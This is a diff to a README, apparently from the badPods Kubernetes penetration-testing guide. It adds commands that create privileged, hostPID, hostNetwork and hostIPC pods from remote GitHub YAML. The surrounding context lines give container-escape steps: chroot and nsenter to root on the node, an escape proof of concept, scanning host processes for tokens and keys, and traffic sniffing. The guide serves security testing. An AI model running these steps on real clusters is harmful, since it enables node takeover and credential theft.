@@ -41,7 +41,7 @@ If there are no pod admission controllers applied,or a really lax policy, you ca
 
 ```bash
 # Create pod
-kubectl [-n namespace] apply -f pod-chroot-node.yaml 
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-chroot-node.yaml [-n namespace]
 # Exec into pod 
 kubectl -n [namespace] exec -it bf-hostpid -- chroot /host
 # Do stuff in pod
@@ -60,8 +60,11 @@ If you have `privileged=true` and `hostPID` available to you, you can use the `n
 [pod-priv-and-hostpid.yaml](yaml/pod-priv-and-hostpid.yaml)
 
 ```bash
-# Create pod
-kubectl [-n namespace] apply -f pod-priv-and-hostpid.yaml 
+# Option 1: Create pod from local yaml 
+kubectl apply -f pod-priv-and-hostpid.yaml [-n namespace] 
+# Option 2: Create pod from github hosted yaml
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-priv-and-hostpid.yaml [-n namespace] 
+
 # Exec into pod 
 kubectl -n [namespace] exec -it bf-nsenter -- bash
 # Use nsenter to gain full root access on the node
@@ -80,8 +83,11 @@ If you only have `privileged=true`, you can still get RCE on the host, and ultim
 
 
 ```bash
-# Create pod
-kubectl [-n namespace] apply -f pod-priv-only.yaml 
+# Option 1: Create pod from local yaml 
+kubectl apply -f pod-priv-only.yaml  [-n namespace] 
+# Option 2: Create pod from github hosted yaml
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-priv-only.yaml [-n namespace] 
+
 # Exec into pod 
 kubectl -n [namespace] exec -it bf-privpod -- bash
 #create undock script that will automate the container escape POC
@@ -102,8 +108,11 @@ If you only have `hostPID=true`, you most likely won't get RCE on the host, but 
 [pod-hostpid-only.yaml](yaml/pod-hostpid-only.yaml)
 
 ```bash
-# Create pod
-kubectl [-n namespace] apply -f pod-hostpid-only.yaml 
+# Option 1: Create pod from local yaml 
+kubectl apply -f pod-hostpid-only.yaml  [-n namespace] 
+# Option 2: Create pod from github hosted yaml
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-hostpid-only.yaml [-n namespace] 
+
 # Exec into pod 
 kubectl -n [namespace] exec -it bf-hostpid -- bash
 # View all processes running on the host and look for passwords, tokens, keys, etc.
@@ -123,8 +132,11 @@ The important things here are:
 
 
 ```bash
-# Create pod
-kubectl [-n namespace] apply -f pod-hostnetwork-only.yaml 
+# Option 1: Create pod from local yaml 
+kubectl apply -f pod-hostnetwork-only.yaml  [-n namespace] 
+# Option 2: Create pod from github hosted yaml
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-hostnetwork-only.yaml [-n namespace] 
+
 # Exec into pod 
 kubectl -n [namespace] exec -it bf-hostnetwork -- bash
 # Install tcpdump and sniff traffic 
@@ -142,8 +154,11 @@ Reference: https://opensource.com/article/20/1/inter-process-communication-linux
 [pod-hostipc-only.yaml](yaml/pod-hostipc-only.yaml)
 
 ```bash
-# Create pod
-kubectl [-n namespace] apply -f pod-hostipc-only.yaml 
+# Option 1: Create pod from local yaml 
+kubectl apply -f pod-hostipc-only.yaml  [-n namespace] 
+# Option 2: Create pod from github hosted yaml
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-hostipc-only.yaml [-n namespace] 
+
 # Exec into pod 
 kubectl -n [namespace] exec -it bf-hostipc -- bash
 # Look for any use of inter= process communication on the host 
